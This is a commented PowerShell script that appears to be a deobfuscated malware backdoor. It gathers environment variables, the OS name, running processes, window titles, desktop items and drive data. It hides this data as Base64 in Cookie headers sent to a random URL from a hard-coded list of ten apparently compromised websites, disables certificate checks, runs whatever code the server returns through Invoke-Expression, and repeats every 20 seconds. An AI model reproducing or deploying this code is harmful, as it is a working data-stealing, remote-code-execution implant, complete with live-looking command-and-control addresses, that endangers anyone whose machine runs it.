# Define a function to process an XML-RPC request
function ProcessXmlRpcRequest($url) {
    $cookieName = "632DAF1175"  # Set the name of the cookie
    
    # Define a nested function to convert data to Base64
    function ConvertToBase64($data) {
        $memoryStream = [System.IO.MemoryStream]::New()  # Create a new memory stream
        $gzipStream = [System.IO.Compression.GZipStream]::New($memoryStream, [System.IO.Compression.CompressionMode]::Compress)  # Create a new GZip stream
        $streamWriter = [System.IO.StreamWriter]::New($gzipStream)  # Create a new stream writer
        $streamWriter.Write([String]::Join("|!", $data))  # Write the data to the stream
        $streamWriter.Close()  # Close the stream writer
        [System.Convert]::ToBase64String($memoryStream.ToArray())  # Convert the stream to Base64 string
    }
    
    $environmentVariables = ("iSfOlDer|SHeLl.applIcAtiON|nAmESPacE|iTeMS|isLinK|NAMe|isfIleSYsTEM").split("|")  # Define an array of environment variables
    $environmentData = ConvertToBase64((Get-ChildItem env: | Where-Object { $_.Value.Length -lt 99 } | ForEach-Object { ($_.Name + "^" + $_.Value) }) + ("OSWMI^" + (Get-WmiObject Win32_OperatingSystem).Caption))  # Get environment data and convert it to Base64
    $processNames = ConvertToBase64(Get-Process | Select-Object Name -Unique | ForEach-Object { $_.Name })  # Get process names and convert them to Base64
    $processWithMainWindow = ConvertToBase64(Get-Process | Where-Object { $_.MainWindowTitle } | ForEach-Object { $_.Name + "^" + $_.MainWindowTitle })  # Get processes with main window titles and convert them to Base64

    $fileData = ConvertToBase64(((New-Object -ComObject SHeLl.applIcAtiON).nAmESPacE(0)) | ForEach-Object {
        if ($_.isLinK) {
            "0" + $_.NAMe  # Prefix with "0" for symbolic link
        }
        elseif ($_.iSfOlDer) {
            "1" + $_.NAMe  # Prefix with "1" for folder
        }
        elseif ($_.isfIleSYsTEM) {
            "2" + [IO.Path]::GetFileName($_.Path)  # Prefix with "2" for file in the file system
        }
        else {
            "3" + $_.NAMe  # Prefix with "3" for other items
        }
        })  # Get file data and convert it to Base64
        $driveData = ConvertToBase64(Get-PSDrive | Where-Object { $_.Free -gt 50000 } | ForEach-Object { $_.Name + "^" + $_.Used })  # Get drive data and convert it to Base64
        
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12  # Set the security protocol to TLS 1.2
        [Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }  # Set the server certificate validation callback
        
        $webRequest = [System.Net.WebRequest]::Create($url)  # Create a new web request object
        $webRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"  # Set the user agent header
        $webRequest.KeepAlive = 0  # Disable keep-alive
        $webRequest.Headers.Add("Cookie: $cookieName=$environmentData; $cookieName`1=$processNames; $cookieName`2=$processWithMainWindow; $cookieName`3=$fileData; $cookieName`4=$driveData")  # Add the cookie header
        # The header value would be: Cookie: 632DAF1175=<environmentData>; 632DAF1175`1=<processNames>; 632DAF1175`2=<processWithMainWindow>; 632DAF1175`3=<fileData>; 632DAF1175`4=<driveData>
        $response = $webRequest.GetResponse()  # Get the web response
        $streamReader = New-Object System.IO.StreamReader $response.GetResponseStream()  # Create a new stream reader
        $responseData = ($streamReader.ReadToEnd()) -split $cookieName  # Read the response data and split it using the cookie name
        
        if ($responseData.Count -eq 3) {
            iex($responseData[1] -replace "^", "")  # Execute the response data using iex (Invoke-Expression)
        }
    }

    while (1) {
        try {
            ProcessXmlRpcRequest(@("https://funtop.tw/xmlrpc.php", "http://sspcresidential.com/xmlrpc.php", "https://magnal-logistics.com/xmlrpc.php", "http://claudeabouchacra.com/xmlrpc.php", "https://pintravel.co.za/xmlrpc.php", "https://dealz.pl/xmlrpc.php", "https://ozayplise.com/xmlrpc.php", "https://moosicborough.com/xmlrpc.php", "https://bevcooks.com/xmlrpc.php", "https://lempod.com/xmlrpc.php") | Get-Random)  # Call the ProcessXmlRpcRequest function with a random URL from the list
        }
        catch {}
        
        Sleep -Seconds 20  # Sleep for 20 seconds
    }
